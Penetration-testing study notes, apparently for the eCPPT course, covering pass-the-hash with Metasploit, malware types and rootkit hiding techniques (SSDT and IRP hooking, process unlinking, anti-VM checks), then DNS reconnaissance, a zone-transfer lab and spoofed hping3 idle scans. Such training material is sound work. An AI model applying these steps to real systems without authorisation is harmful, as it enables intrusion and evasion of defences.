Hashes?  → Pass-the-hash   with metasploit:  exploit/windows/smb/psexec set options if you do not have both LM and NT hashes you can set one of them with 32 0''s. 0000000:hash   → Crack the Hash  &lt;user&gt;:&lt;hash&gt; john ophcrack Hashcat RainbowCrack   Malware   Malware = Malicious Software   Virus  A computer virus is a computer program that copies itself and spreads without the permission or knowledge of the owner.   Resident: \tbecomes memory resident (and waits For some triggers such as loading of other program). It then infects other programs and so on.   Non-resident: \tit will search For files it can infect. After infecting them, it will quit. When the infect program is run again, it will again find new targets and so on.   Boot-sector: \tspreads via boot sectors. If a infected CD is left in the system, after boot-up it will infect the HD and another drivers.   Multi-partite: \tHas few types of infection mechanisms such as they have both boot-secot and resident type or even more.   Trojan Horse  It looks like will perform a function byt in fact facilitates unauthorized access to the ownwes system. like the greek mythology They are not self-replicating unlike viruses.   Rootkit  Designed to hide the fact that a compromise has already been done or to do the compromise at a deeper level. rootkit is used as a supplement to other malware. can be used to hide processes, files, implement backdoors and/or create loopholes. they are installed as drivers ( or kernel modules).   Application level: \tThey replace actually programs with copies of other programs.   Library level: \texample: 10 apps area sharing a library, taking control of the library means taking control of all 10 apps.   Kernel level: \tmost common type.  \tknown For their resistance to removal since they run at the same privilege level at which anti-virus solutions runs.   Hypervisor level: \tcpus come up with support For virtualization. Rootkits which use such processor specific technologies are called hyper-visor rootkits: e.g. blue-pill and subvirt.   Firmware level: \trootkits For BIOS, ACPI tables or devices ROMS. high chance of survival because curretly, no tools exist to verify/scan up the firmware level rootkits.   Bootkit  like rootkits, but grab the OS during the boot process itself they start attacking the OS when the OS has not even started, so they are able to completely violate the security of the targer operation system.   Backdoor  software that helps bypassing authentication mechanism, keeping remote access open ( For later use) which trying to remain hidden.   Adware  advertising supported software which displays ads from time-to-time during the use of the software. can be a spyware. also install unwanted software, which can be a malware.   Spyware  software that keeps spying the user activities, collecting informations without consent. the informations is sent to the attacker usually has other kinds of malwares to hide the tracks and to keep in control of the machine.   Greyware  spyware + adware   Dialer  software that connect to premium numbers which are charged highly. so the attacker makes money   Key-logger  keep a log of key been pressed by the user, so it can steal information, passwords, etc   software keylogger: \tkernel mode or user mode keyloggers   hardware keylogger: \tfirmware based keylogger can be put in the BIOS   PS/2 and USB keyboards can be sniffed with an additional devide placed between the keyboard port and CPU.   wireless keyboard sniffer: \tpassive sniffers can be used to collect keyboard data in case of wireless keyboards   acoustic keylogger: \tbased on the sound made when a key is struck by the user. \tafter some time of data logging, clear patterns can be distinguished when a key is pressed or release which leads to remote passive keylogging.   optical keylogger: \tperson standing beside you. \tused to steal ATM PINs or passwords   Botnet  Collection of compromised computers which run commands automatically and autonomously. typically created when a number of clients install the same malware the control of bonet is called bot master, and is usually the one who gives commands to the bots DOS, send SPAM, etc   Ransomware  Locks down files with a password then demands money to unlock the files. also called Extortive Malware.   Data Stealing Malware  steal data such as private encryption keys, credit-card data, competitors data such as internal secret algorithms, new product designs and other internal data which could be used by third party. can be highly targeted and never detected   Worm  Software which use network/system vulnerabilities to spread themselves from system to system normally an entry point into the system can be local or remote, and can provide access to other malwares      Techniques used by Malware   Cover methods:     Streams   Hooking native Apis / SSDT   Hooking IRP   Streams  Are a feature of NTFS file system Microsoft calls them Alternate Data Stream Alternate Data stream can be used to stored file meta data / or any other data. it has no name (all other streams have a name).   example in Windows:  \techo 'this data is hidden in the stream' &gt;&gt; sample.txt:hstream \tit should appear the file with 0 bytes \tmore &lt; sample.txt:hstream   SSDT - System Service Descriptor Table  Native API is API which resides in ntdll.dll and is used to communicate with kernel mode. This communication happens using SSDT table. For each entry in SSDT table, there is a suitable function in kernel mode which completes the task specified by the API. somethin like that:    → User mode Native API &lt; SSDT Table &gt; Kernel mode   SSDT table resides in the kernel and is exported as KeServiceDescriptorTable Services available For reading/writing files: \tNtOpenFile \tNtCreateFile \tNtReadFile \tNtWriteFile \tNtQueryDirectoryFile (used to query contents of the directory)      Hooking means that we sent our malicious function to be called instead of the actual function.      Hook SSDT table entry corresponding to NtQueryDirectoryFile   Now, whenever the above function is called, your function will be called   Right after your function gets called, call original function and get its result (directory listing)   If the result was successful, modify the results (hide the file/sub-dir you want to hide)   Now pass back the results to the caller   You are hidden      Nowadays almost all antivirus scan SSDT table For modifications (They can compare it with the copy stored in the kernel) and thus detection can be done.    Hooking IRP - I/O Request Packets  Transmit piece of data from one component to another Almost everything in the windows kernel use IRPs For example network interface (TCP/UDP, etc), file system, keyboard and mouse and almost all existent drivers.   Become a Filter Driver: \tRegister with the operating system as a filter driver or an attached device.   Hooking the Function Pointer: \tTHey array is just a table with function pointers and can be easily modified.   example:  \told_power_irp = DriverObject-&gt;MajorFunction[IRP_MK_POWER]; \tDriverobject-&gt;MajorFunction[ IRP_MK_POWER] = my_new_irp;   The basic IRP design is do that after an IRP has been created, its passed to all the devices registered at lower levels.      Pre-processing    is done when an IRP arrives   Post-processing   is done when the IRP has been processed by all the level below current level.   Each devide object has its own function table. Hooking the function pointers of such objects is called DKOM (Direct Kernel Object Manipulation)   All file-systems, network layers, devices like keyboard, mouse etc. Have such objects.   For example:  \t\\device\\ip \t\\device\\tcp \t\\Device\\KeyboardClass0 \t\\FileSystem\\ntfs   Filter drivers are basically used by antiviruses to get control whenever a new file is written   Hiding a Process  it requires a combination of different techniques 1. hook NTOpenProcess native API 2. Hide the process from EPROCESS list 3. Unling the structure relative to our process from the list &lt;ActiveProcessLinks&gt; 4. if the driver is loaded, you will also have to unlink it from the &lt;PsLoadedModuleList&gt;   API hooking  → IAT = Import Address Table Its used to resolve runtime dependencies example: \tMessageBoxA API in WIndows, your compiler automatically links to user32.dll \tThis makes your program dependent on user32.dll IAT hooking involves modifying the IAT table of the executable and replace the function with our own copy   → EAT = Export Address Table This table is maintained in DLLs (dynamic link library) Theses files contain support functions For other executables files Most of the times EAT hooking is utilized only on DLLs while IAT hooking can be done on both EXEs and DLLs.   → Inline Hooking modify the first few bytes of the target function code and replace them with our code which tells the IP (Instruction Pointer) to execute code somewhere else in memory  Whenever the function gets executed, we will get control of execution; After doing our job, we have to call the original function so we have to fix up the modified function.   Anti-Debugging Methods  Set an exception handler Cause an exception with INT 2dh if a debugger is attached and does not pass the exception to us, we get to debug_detected because an exception occurred For sure.   Anti-Virtual Machine  security analysts analyzing malwares run the code in virtualized OS the technique basically work on the SIDT instruction, which returns the IDT table address ``` - Real windows machine always have 0x80 For their MSB - if eax !=0 we are emulating windows ```   Obfuscation  Transform/change a program in order to make it more difficult to analyze while perserving functionality Code obfuscation is used both by malware and legal software to protect itself. The difference is that malware use it to either prevent detection or make reverse engineering more difficult.   Anti-virus Engines are based on signature matching, thus they are based on purely syntactic information and can be fooled by such techniques.   Packers  software which compress the executables. were designed to decrease the size of executables files. but malware authors recognized that decreasing file size will also decrease number of patterns in the file, so less chances of detection by anti-virus.   Polymorphism  Aims at performing a given action (or algorithm) through code that mutates and changes every time the action hast to be taken. making difficult to detect constamt encoding and variable decryptor A virus having XOR key to encrypt its variant also falls into polymorphic category   Metamorphism  it can be defined as polymorphism with polymorphism applied to the decryptor/header as well   ways to implement:  Garbage Insertion: \tGarbage data/instructions are inserted into the code, For example NOP instructions (\\x90) are inserted           Register exchange:   The registers are exchanged in all the instruction.            Permutation of code blocks:   code blocks are randomly shuffled and then fixed up, so that the execution logic is still the same.            Insertion of jump instructions:   Some malware mutate by inserting jumps after instructions (the instruction is also relocated), so that the code flow does not change.            Instruction substitution:   one instruction (or set of instructions) are replaced by 1 or more different instruction which are functionally equivalent to the replaced set.            Code integration with host:   the malware modifies the target executable (which is being infected) by spraying its code in region of the EXE.   it can compress the original code (or even damage the file completely) to survive/or not be detected.       How Malware Spreads?           Email Attachments   social engineering should invite the user to execute the attachment            Already Infected Files   one virus can cause re-infection, or infect other files   once you are infected with a virus, its then hard to remove the infection from the system            Peer-2-peer File Sharing   Nowadays, around 30-40% of all available files in file-sharing networks can be infected with malware   some programs that have to be connected to internet to function, they go through network-interfacing code has not been verified by any third party. They might contain hidden backdoor (knowingly and unknowingly)            Web-Sites   Drive-by downloads are triggered upon visiting an HTML page.   This includes email addresses            System vulnerabilities   internet connection / local network can pass virus by OS vulns   these kind of attacks can be stopped by using correctly configured firewalls or simply applying patches   but if the firewall is not correctly configured, it can appear their own set of bugs   so the best way to be protected is to update your software as soon as possible          However there is no 100% security.. even if you are completely updated.    Samples           Keylogger   If you are thinking of using it against one of your target organization employees make sure to ask For written permission during your engagement negotiation phase.   keylogger its used not only For capture keystrokes, but also as a spy tool.       Trojan its easily usable with lots of features. like:     open/close cd-rom how optional bpm/jpg image swap mouse buttons start options application play music file control mouse shutdown windows show different types of message to user download/upload/delete files go to an optional URL send keystrokes and disables keys listen For and send keystrokes take a screen-dump           Virus   detection is done by matching the patterns within virus code with the database signature   ","categories": ["notes","ecppt"],
        "tags": ["begginer","pentest","lowlevel","bof"],
        "url": "/notes/ecppt/systemsecurity/",
        "teaser": "/assets/images/posts/2023-11-19-ecppt/ecppt-teaser2.jpg"
      },{
        "title": "2 - Network Security",
        "excerpt":"  Information Gathering   Business: \tdeals with collecting information regarding the type of business, its stakeholders, assets, products, services, employees and generally non-technical information;   Insfrastructure: \tnetworks, systems, domains, IP addresses, etc   Can be Passive or Active   Passive or OSINT: \tweb presence, partners, financial info, physical plants, infrastructure related information etc \tget information without exposing our presence. \tusing publicly available resources (accessible by anyone)   Active: \tgather information about ports, services, running systems, net blocks etc \tactive techniques can reveal the investigation to the organization through IDS or server logs so caution should be taken to prevent this.   Mind mapping technology  FreeMind = http://freemind.sourceforge.net/wiki/index.php/Main_Page Xmind = https://www.xmind.net/   keep track of networks/vulns scans  Dradis = http://dradisframework.org/ Faraday = https://github.com/infobyte/faraday Magitree = http://www.gremwell.com/what_is_magictree   Search Engine   Web Presence      What they do   what is their business purpose   physical and logical locations   employees and departments   email and contact information   alternative web sites and sub-domains        press releases, new, comments, opinions       start with the company name company website analyze information that is publicly available   Google Dorks  https://www.exploit-db.com/google-hacking-database/ http://pdf.textfiles.com/security/googlehackers.pdf http://www.googleguide.com/advanced_operators_reference.html   Organization that operate globally  \tDUNS number (duns and bradstreet) \tcage code (or ncage \\for a non us business) \thttps://www.sam.gov/ \thttp://www.sec.gov/edgar.shtml      Partners: through the partners you can gather information such as the technology stack the organization uses (hardware and software), tools, systems etc   Job Postings  Through career opportunities, you can gather information such as internal hierarchies, vacancies, projects, responsabilities, weak departments, financed projects, technology implementations and more.   List of websites that you can use to find job posts:  \thttp://www.linkedin.com/ \thttp://www.indeed.com/ \thttp://www.monster.com/ \thttp://www.careerbuilder.com/ \thttp://www.glassdoor.com/ \thttp://www.simplyhired.com/ \thttp://www.dice.com/   Financial Information  you can find out if the organization: \tis going to invest in a specific technology \tmight be subject to a possible merge with another organization \thas critical assets and business services http://www.crunchbase.com/ crunchbase is a databse where you can find information about: \tCompanies \tPeople \tInvestors and financial information   http://www.inc.com/   Documents and Files  such as: \tcharts (detailing the corporate structure), database files, diagrams, papers, documentation, spredsheet etc then: \tharvest emails, accounts (twitter, facebook etc), names, roles, etc extract useful information in the metadata of the file   in google:  \tsite:[website] and filetype:[filetype]   Harvest files with tools: FOCA: [windows based] \thttps://www.elevenpaths.com/labstools/foca/index.html TheHarvester: \thttps://github.com/laramies/theHarvester \ttheharvester -d [domain] -l [limits of results] -b google/bing/linkedin   Cached and archival sites  waybackmachine \thttp://www.archive.org/index.php   in google  \tcache:URL   Lab 2  Target organization: University Campus.   Scope: The scope is limited to the following domain and netblock:      Netblock: 10.50.96.0/23      Domain: foocampus.com -  Task 1 : host discovery \tfping -a -g 10.50.96.0/23 2&gt;/dev/null &gt; hosts-up  \tnmap -sn 10.50.96.0/23   10.50.96.5 10.50.96.15 10.50.97.6 10.50.97.5 10.50.97.15      Task 2 : Host discovery no ping     //nmap -p 80,443,53,22 10.50.96,97.5.15.6 -T4 nmap -n -sn -PS22,135,443,445 10.50.96.0/23  to not generate to much traffic, we will use argument -PS  with this scan we discovered another ip  10.50.97.17 &gt; because it was probably blocking pings with firewall                Task 3 : difference the second scan discovered a new host in the network, because it probably has firewall that is blocking pings       Task 4 : dns both have the port 53 open, so I assume its dns     nmap -sS -sU -p53 10.50.96.0/23 10.50.96.5 10.50.96.15           task 5 : name server we found 2 dns ips before, so we will focus on them   1) &gt;&gt;nslookup 2) &gt;&gt;server 10.50.96.5 3) &gt;&gt;set q=NS 4) &gt;&gt;foocampus.com   printsection()  foocampus.com   nameserver = ns1.foocampus.com foocampus.com   nameserver = ns.foocampus.com  &gt; server 10.50.96.5 Default server: 10.50.96.5 Address: 10.50.96.5#53 &gt; ns.foocampus.com Server:         10.50.96.5 Address:        10.50.96.5#53   discovering new ips with nslookup  Name:   ns.foocampus.com Address: 10.50.96.21 ------------------------------------------ Name:   ns1.foocampus.com Address: 10.50.96.22      task 6 - MX Record   &gt;&gt; nslookup &gt;&gt; server 10.50.96.5 &gt;&gt; set q=MX &gt;&gt; foocampus.com  printsection() foocampus.com   mail exchanger = 10 pop3.foocampus.com.      task 7 : zone transfer    \tdig @10.50.96.5 foocampus.com -t AXFR +nocookie \thost -t axfr foocampus.com 10.50.96.5  ; &lt;&lt;&gt;&gt; DiG 9.17.19-1-Debian &lt;&lt;&gt;&gt; @10.50.96.5 foocampus.com -t AXFR +nocookie                                           ; (1 server found)                                                                                                     ;; global options: +cmd                                                                                                foocampus.com.          3600    IN      SOA     foocampus.com. campusadmin. 47 900 600 86400 3600                      foocampus.com.          3600    IN      NS      ns.foocampus.com.                                                      foocampus.com.          3600    IN      NS      ns1.foocampus.com.                                                     foocampus.com.          3600    IN      MX      10 pop3.foocampus.com.                                                 ftp.foocampus.com.      3600    IN      A       10.50.96.10                                                            intranet.foocampus.com. 3600    IN      A       10.50.96.15                                                            management.foocampus.com. 3600  IN      A       10.50.96.15                                                            ns.foocampus.com.       3600    IN      A       10.50.96.21                                                            ns1.foocampus.com.      3600    IN      A       10.50.96.22                                                            pop3.foocampus.com.     3600    IN      A       10.50.96.60                                                            www.foocampus.com.      3600    IN      A       10.50.96.15                                                            foocampus.com.          3600    IN      SOA     foocampus.com. campusadmin. 47 900 600 86400 3600                      ;; Query time: 519 msec                                                                                                ;; SERVER: 10.50.96.5#53(10.50.96.5) (TCP)                                                                             ;; WHEN: Sat Dec 04 10:49:45 -03 2021                                                                                  ;; XFR size: 12 records (messages 12, bytes 685)       task 8 - draw the network map   ~      task 9 - Report your findings After scan the network, we discover various IPS addresses from DNS and through that we discover more IPs from ftp, intranet, name server, email server etc.   dig axfr -x 192.168 @192.214.31.3      to show only reverse dns entries    network map of lab 2 - 10.50.96.0/23   Social Media  with the help of social media, a pentester can gather:  \tphone numbers \taddresses \thistory \tCV \topinions \tresponsabilities \tproject  \tetc   social media is useful in the following ways: \tlearn about corporate culture, hierarchies, business processes, technologies, applications \tto build a network map of people (relationships) \tselect the most appropriate targer For a social engineering attack   On linkedin you can perform  advanced search functions on people based upon: \tcurrent title, position, location, company, etc   when you have limited access because maybe you dont have connection with the person etc: \tupgrade your linkedin account \tuse a specific query in a search engine in order to find (if exists) the public linkedin profile of the target      Why is building a network of people important? \tsocial engineering is the art of exploit trust relationships \tyou can get to bob through a person he trusts etc    people search  \thttp://www.pipl.com/ \thttp://www.spokeo.com/ \thttp://www.peoplefinders.com/ \thttp://www.crunchbase.com/   At this point we should have gathered:  \tage, phone number, business, adresses, occupation, interests \tfurther we go to: emails, related docs, website owned, financial info   Infrastructures  goal is retrieve data such as:  \tdomains \tnetblocks or ip addresses \tmail servers \tISP used \tany other technical information   The approach depends upon the SOE (Scope of Engagement) Lets assume the below listed cases: \tcase 1 - we have the name of the organization (full scope) \tcase 2 - we only have specific net blocks to test           case 1 This process aims to collect all the hostnames related to the organization and relative IP addresses The process ends when we obtain:   domains, dns servers in use, mail server, ip addresses            First step WHOIS = is a query/response protocol, used For querying an official domain registrer database in order to determine:        the owner of a domain name   ip address or range   autonomous system   technical contacts   expiration date of the domain           The web based whois is there, normally runs on tcp port 43 \thttps://tools.ietf.org/html/rfc3912      A Regional Internet Registry (RIR)   organization that manages resources such as IP addresses and Autonomous System For a specific region. There are five main RIR provides For WhoIs information:       AFRINIC - africa   APNIC - asia   RIPE NCC - europe   ARIN - north america   LACNIC - south america           information obtained from whois:       Number Resource Records   Network numbers (ip addresses) = NETs   Autonomous system numbers = ASNs   Organization records = ORGs   Point of contact records = POCs   Authoritative information \\for Autonomous system numbers and registered outside of the RIR being queried           Tools that allow you to use WHOIS:  \thttp://who.is/ \thttp://whois.domaintools.com/ \thttp://bgp.he.net/ \thttp://networking.ringofsaturn.com/Tools/whois.php \thttp://www.networksolutions.com/whois/index.jsp \thttp://www.betterwhois.com/      What information did we get from WHOIS that can help determine the infrastructure of the organization? \tName servers! These are servers that store all the dns related information (records) about the domain       DNS = Domain Name System   key aspect of information security as it binds a hostname to an IP address and many protocols such as SSL are as safe as the DNS protocol they bind to.   contains textual records   each record has a given type, each with a differente role   DNS Queries     DNS queries produce listings called Resource Records.       Resource Record A Resource record starts with a domain name, usually a fully qualified domain name. If anything other than a fully qualified domain name is used, the name of the zone the record is in will automatically be appended to the end of the name.   Time-To-Live (TTL) recorded in seconds, defaults to the minimum value determined in the start of authority (SOA) record   Record Class Internet, Hesiod or Chaos   Start of Authority (SOA) Indicates the beginning of a zone and it should occur first in a zone file. There can be only one SOA record per zone. Defines certain values For the zone such as a serial number and various expiration timeouts.   Name Server Defines an authoritative name server For a zone. Defines and delegates authority to a name server For a childe zone. NS Records are the GLUE that binds the distributed database together,   Address The A record simply maps a hostname to an IP address. Zones with A records are called forward zones.   Pointer The PTR record maps an IP address to a Hostname. Zones with PTR records are called reverse zones.   CNAME The CNAME record maps an alias hostname to an A record hostname   Mail Exchange (MX) The MX record specifies a host that will accept email on behalf of a given host. The specified host has an associated priority value A single host may have multiple MX records. The records For a Specific host make up a prioritized list.   DNS Lookup     DNS lookup asks the DNS to resolve a given hostname to the corresponding IP.    nslookup &lt;target-organization.com&gt;   First u need to discover the IP addresses then try to resolve them.   Reverse DNS lookup  we will receive the IP address associated to a given domain name. This process queries For DNS pointer records (PTR). command line:  \tnslookup -type=PTR &lt;ip address&gt;   online tool: \thttp://network-tools.com/nslook/   MX (Mail Exchange) lookup  we retrieve a list of servers responsible For delivering emails For that domain. command line:  \tnslookup -type=MX &lt;domain&gt;   only tools: \thttp://www.dnsqueries.com/en/ \thttp://www.mxtoolbox.com/   Zone transfers  zone transfers are usually a misconfiguration of the remote DNS server. They should be enabled only For trusted IP addresses (usually trusted downtream name servers). When zone transfers are enabled, we can enumerate the entire DNS record For that zone, This includes all the sub domains of our domain (A records)   \tnslookup -type=NS &lt;domain.com&gt;   There are usually two name servers, Take note of both of them.  \tnslookup \tserver &lt;domain.com&gt; \tls -d &lt;domain.com&gt;      Dig = http://linux.die.net/man/1/dig is a poweful tool, we can learn both nslookup and dig   nsloolup &amp; Dig commands  \t                                                        // dig +nocmd &lt;domain&gt; mx +noall +answer  \tnslookup &lt;target.com&gt;                   // dig &lt;target.com&gt; +short \tnslookup -type=PTR &lt;target.com&gt; // dig &lt;target.com&gt; PTR \tnslookup -type=MX &lt;target.com&gt;  // dig &lt;target.com&gt; MX \tnslookup -type=NS &lt;target.com&gt;  // dig &lt;target.com&gt; NS \tnslookup                                         // dig axfr @target.com &lt;target.com&gt; \t- server &lt;target.com&gt; \t-- ls -d &lt;target.com&gt;   Fierce  \tfierce -dns &lt;domain.com&gt; \tfierce -dns &lt;domain.com&gt; -dnsserver &lt;dns server&gt;   DNS Enum  \tdnsenum &lt;domain.com&gt; \tdnsenum &lt;domain&gt; --dnsserver &lt;dns server&gt; \tdnsenum &lt;domain&gt; -f &lt;list of hosts&gt;   DNS Map - subdomain bruteforcer  \tdnsmap &lt;domain&gt;   DNS Recon  \tdnsrecon -d &lt;domain&gt;   IP  Once we have found a number of host names related to the organization, we can move on with both determining their relative IP addresses and, potentially any Netblocks associated with the organization. \tFirst think, try to resolve all the hostnames we have, in order to determine what IP addresses are used by the organization.     → nslookup ns.&lt;target-organization.com&gt; = hostname   the dns will handle the query *our dns* then we should receive the IP address of the target   After getting the IP addresses: \tis this ip hosting only that given domain? \twho does this IP address belong to?   subdomains  on Bing search: we can find subdomains that are bounded to the ip address of domain  \tip:&lt;ip address&gt;   there are tools:  \thttp://reverseip.domaintools.com/ \thttps://dnslytics.com/reverse-ip \thttps://networkappers.com/tools/reverse-ip-checker \thttps://www.robtex.com/   netblock  Is a range of IP addresses.  example:  \t192.168.0.0 - 192.168.255.255 \t192.168.0.0/16 or 192.168.0.0 with 255.255.0.0 netmask      AS - Autonomous System Is made of one or more net blocks under the same administrative control Big companies and ISP (internet service providers) have an autonomous system, while smaller companies will barely have a netblock.      Run some WHOIS tool, to discover who is the owner of the IP addresses.    Some tools will automatically perform these operations:  \thostmap \tmaltego \tfoca \tfierce \tdmitry      After getting a list of IP Addresses:   we need to identify which of those are alive   Here starts Case 2      once we have a list of ip addresses we have to identify the devices and the roles played by each IP in the network.   First: \tDetermine hosts that are alive \tDetermine if they have an associated host name/domain   The most common technique to identify live hosts is ICMP ping sweep, the live hosts will return an ICMP ECHO reply. Some tools: \tfping \tnmap \thping3 \tmaltego   fping -a -g &lt;ip/24&gt; \t-a = alive / -g = generate list / -r = number of retries / -e = time required /    nmap -sn &lt;ip/24&gt;  \t-sn = ping scan/sweep = no port \t--disable-arp-ping \t-PS = tcp flag with syn flag attached / -PS&lt;port&gt; \t-PA = tcp flag with ack / -PU = udp packet / -PY = tcp INIT packet / -PE = icmp echo request / \t-PM = icmp mask request / -PP = timestamp request /    hping3 --icms-ts &lt;192.168.1.x&gt;  \ticmp-ts = timestamp / -c = count / -v = verbose / -S = syn flag / -p = port / -F = fin flag /  \t-U = urgent / -X = ecn flag / -Y = CWR flag / -P = PSH flag / -I = interface / -1 = icmp /  \t--rand-dest = to use with x as a wildcard /       maltego    Nowadays, ICMP is often disabled on perimeter router and firewalls via Firewall      Now that we know which host is alive DNS server runs on:      TCP port 53  UDP port 53           To discover which host is running dns:  \tnmap -sS -p 53 [netblock] = tcp \tnmap -sU -p 53 [netblock] = udp      After getting the DNS servers, we can perform a reverse lookup to find out more information. Its a cyclical process, when we find IPs we search For alives, search For DNS, services, etc    Tools     Most common tools For information gathering:       DNSdumpster = https://dnsdumpster.com/       // not instrusive, create a map For easy visualization           DNSEnum = https://github.com/fwaeytens/dnsenum       // gather as much information as possible   // --private = show and save private ips // --subfile &lt;file&gt; = write all valid subdomains to this file   // -p &lt;page&gt; = number of google search pages to process   // -s &lt;value&gt; = number of subdomains that will be scraped from google   // -f &lt;file&gt; = read subdomains from this file to perform bruteforce   // -u = update any file that may exist already // -r = recursive brute force   // it comes with a wordlist file For bruteforce /usr/share/dnsenum           DnsMap = https://github.com/makefu/dnsmap       // uses the primary domain that we provide as a target and then brute forces all the subdomains   // also comes with a wordlist   // -w &lt;wordlist // -r = using the built-in wordlist // path = to save the results in that path           Foca = https://www.elevenpaths.com/labstools/foca/index.html       // allows us to mine a ton of information about the target infrastructure   // metadata = contains further information about the file, creation day, user who create, software used etc           More:  - Metagoofil - Fierce\t - Maltego - Dmitry - Recon-ng - Shodan = shodan.io // exploits.shodan.io   Scanning   Overview     Now that we have basic information, we need information about devices in the target network.    PPS = Ports, Protocols and Services \treference: http://www.iana.org/assignments/port-numbers         The Three Way Handshake       Sequence Number   Acknowledgement numbers   SYN and ACK flags           Packet analyzer tools   Hping = http://hping.org/   \t// hping3 &lt;ip&gt; -p 80 \t//-S = syn packet // -c &lt;number&gt; = count the packets //       Nping = https://nmap.org/nping/      The flags we got as answers : RA (Reset and Acknowledgement) = no service listening SA (Syn and ACK) = the port is open    Wireshark     capture and inspect the whole traffic we receive/send in the network interface    Filters  ip.addr==&lt;ip&gt; ip.src==&lt;ip&gt; - source ip.dst==&lt;ip&gt;  - destination ip.addr==&lt;ip&gt; and (dns or http) != - negate/inverse   arp http  icmp  http or dns ssh   tcp.port==&lt;port&gt; udp.port==&lt;port&gt; tcp.flags.syn==1 and tcp.flags.ack==1 and ip.addr==&lt;ip/network&gt; tcp contains *string*      show packets to show full packet traffic information   HPING Basics   hping3 -h  -S = SYN packet, its good For stealth because after receiving the syn/ack the OS closes the connection and does not finish the 3way handshake -p = port -c = count, its how many packets do you wanna send --scan &lt;1-100//80,139,445//all, known&gt; = sets a range/set of ports we wanna scan \t!50 = we can put a exception to a port that we do not wanna scan -2 or --udp = to scan udp ports -FPU = (FIN, PSH, URG flags) to avoid firewalls, if u dont have anwers its because the port is open or filtered \taka Xmas scan   IDLE scan   Finding the zombie   First we need to search For open ports on the host (zombie target):  \thping3 -S --scan known &lt;zombie ip&gt;   Estimate the host (zombie):  \thping3 -S -r -p &lt;port&gt; &lt;zombie ip&gt; \t// -r = tells the tool to display ID increments intead of the actual ID, if the IP ID increases by 1, its a viable candidate \thowever: we have to validate if its a global or local increase. some hosts increase IP ID on a per host basis      Craft a packet:       hping3 -a &lt;zombie IP&gt; -S -p &lt;target port&gt; &lt;target IP&gt;   // -a = spoof the zombie source address   // -s = syn flag enabled   // -p = destination port            Detect if its a good zombie:       hping3 -S -r -p &lt;port&gt; &lt;zombie ip&gt;   // if in the output the ID increment is +2, we can deduce that the [target port] on [target ip] is open.              [+] info we can run the 2 commands together: first tab = we run the verication in the zombie host second tab = the crafted packet, to discover if the target port is open we will receive the answer is the first tab, its open if the value of ID is incremented by 1    idle scan - hping = stealth mode      Detect Live Hosts and Ports   firewalls made more difficult to scan ports based upon the type of discovery launched against the target, the level of noise produced varies.      running a straight ping sweep of a network = surely its gonna be noisy        a random TCP connect scan may appear normal to the administrators       always depend on the scope document, time limited schedule etc      Penetration testing takes times if u want to do it correctly    NMAP (Network Mapper)  network enumeration and auditing tool. https://nmap.org/book/man-port-scanning-techniques.html   ps: use nmap with root privileges, cause some scans require system access.      → nmap &lt;scan type&gt; &lt;options&gt; &lt;target&gt;   HOST DISCOVERY:    -sL: List Scan - simply list targets to scan   -sn: Ping Scan - disable port scan   -Pn: Treat all hosts as online -- skip host discovery   -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports   -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes   -PO[protocol list]: IP Protocol Ping   -n/-R: Never do DNS resolution/Always resolve [default: sometimes]   --dns-servers &lt;serv1[,serv2],...&gt;: Specify custom DNS servers   --system-dns: Use OSs DNS resolver   --traceroute: Trace hop path to each host   SCAN TECHNIQUES:    -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans   -sU: UDP Scan   -sN/sF/sX: TCP Null, FIN, and Xmas scans   --scanflags &lt;flags&gt;: Customize TCP scan flags   -sI &lt;zombie host[:probeport]&gt;: Idle scan   -sY/sZ: SCTP INIT/COOKIE-ECHO scans   -sO: IP protocol scan   -b &lt;FTP relay host&gt;: FTP bounce scan   -sS (TCP SYN scan)  can be performed quickly and are not as obstrusive as other types of scans. its also the most accurate half-open scanning syn &gt; syn/ack = port open / rst = closed &gt; then our machine closes the connection with RST   -sT (TCP Connect scan)  its the default type its also used in case ipv6 is running its less efficient, because it relies on the OS to perform the connection. it complete the 3w handshake, sending an ack flag before closing with rst/ack.   -sU (UDP scan)  there are other services that run and communicate over UDP (DNS, SNMP, DHCP, etc) much slower   -sI (Idle scan) ‘very stealthy mode’  stealth technique that involves the presence of a zombie in the target network. a zombie is a host that is not sending or receiving any packets thus, the reason its called an idle scan. IP protocol implements a Fragmentation ID Header = https://tools.ietf.org/html/rfc791 and that many OS increase its value by 1 (For each packet).      How to execute Alors, we can scan a host without sending a single packet from our original IP address. Thats awesome For redteam, stealth scopes;       nmap -Pn -sI &lt;zombie ip&gt;:&lt;zombie open port&gt; &lt;target ip&gt; -v    // -Pn = prevents pings from the original (our) IP   // -v = verbose   // -sI = idle scan, using a zombie pc in the network to scan the target   // we can specify the ports with -p              For more information about idle scan \thttp://nmap.org/book/idlescan.html     -PE  enables ICMP echo request host discovery   -n (Never do DNS resolution)  The *-n* is another option we should use whenever possible if resolving IP addresses to hostnames is not required. Its an additional flag we can add to our Nmap scans to decrease our scan times, and also helps us stay a bit more *under the radar*, as reverse DNS lookup can generate more noise than necessary.   -b (FTP Bounce scan)  another stealthy scan. https://en.wikipedia.org/wiki/FTP_bounce_attack this scan exploits a FTP server port command and if FTP server is vulnerable, allows us to launch port scans from the ftp server to other machines on the internet. we dont have direct access to on an internal network its way to hide our true source   -sN; -sF; -sX (TCP NULL, FIN, Xmas scans)  http://www.rfc-editor.org/rfc/rfc793.txt - page 65  They exploit a loophole in order to differentiate between open and closed ports. if a system compliant with the TCP RFC receives a packet that does not contain  the required bits (syn, rst, ack), it will return: -&gt; a RST if the port is closed -&gt; no response if the port is open *As long as none of those three required bits are included (syn, rst, ack), other bits (fin, psh, urg) are acceptable.* ``` -sN = Null scan : does not set any bits (tcp flag header is 0) -sF = FIN scan : Only sets the TCP FIN bit -sX = Xmas scan : Sets the FIN, PSH and URG flags, lighting the packet up like a christmas tree. ```      Nowadays the stealth is these techniques have been eliminated, because stateful firewalls and IDS sensors. Moreover, these scans cannot always determine if a port is open or filtered. So nmap will return a open/filtered result and you will have to test further to determine the actual state.    -sA (TCP ACK scan)  its not used to determine open ports. its used to map out the rulesets of firewalls and determine if the devices are both stateful and which ports are filtered. the ACK bit its the only one set. Open/Closed ports will return a RST packet, nmap will mark as *unfiltered* = // there is no firewall ports that do not respond back, will then be labeled as *filtered* = // there is firewall blocking   -sO (IP protocol scan)  enumerates the types of IP protocols that a target system supports are on the lookout For ICMP protocol unreachable messages if nmap receives any response in any protocol from the target host, nmap marks that protocol as open.   OUTPUT Results  Nmap offers various options to output the results we can save the 